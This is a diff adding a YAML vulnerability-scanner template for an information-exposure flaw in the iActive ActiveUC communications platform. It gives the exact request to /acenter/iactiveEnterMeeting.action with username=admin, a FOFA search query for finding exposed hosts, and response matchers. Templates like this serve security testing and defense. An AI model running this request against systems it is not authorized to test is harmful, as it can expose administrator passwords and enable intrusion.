@@ -1,0 +1,36 @@
+id: iactive-activeuc-info-leak
+
+info:
+  name: iActive activeuc - Information Exposure
+  author: qwtd
+  severity: high
+  description: |
+    网动统一通信平台是采用统一的通信界面，将VoIP电话系统、电子邮件等多种沟通方式融合的企业IT平台，接口 /acenter/iactiveEnterMeeting.action?roomid=1&username=admin 存在信息泄露漏洞，可能导致管理员密码泄露获取后台权限等。
+  reference:
+    - https://wiki.wy876.cn/#/./%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0(ActiveUC)%E6%8E%A5%E5%8F%A3iactiveEnterMeeting%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="网动统一通信平台"
+  tags: iActive-Yunview
+
+http:
+  - raw:
+      - |
+        GET /acenter/iactiveEnterMeeting.action?roomid=1&username=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "layoutURL='"
+          - "layoutName='"
+          - "installUrl"
+          - "isRoomCtrl"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
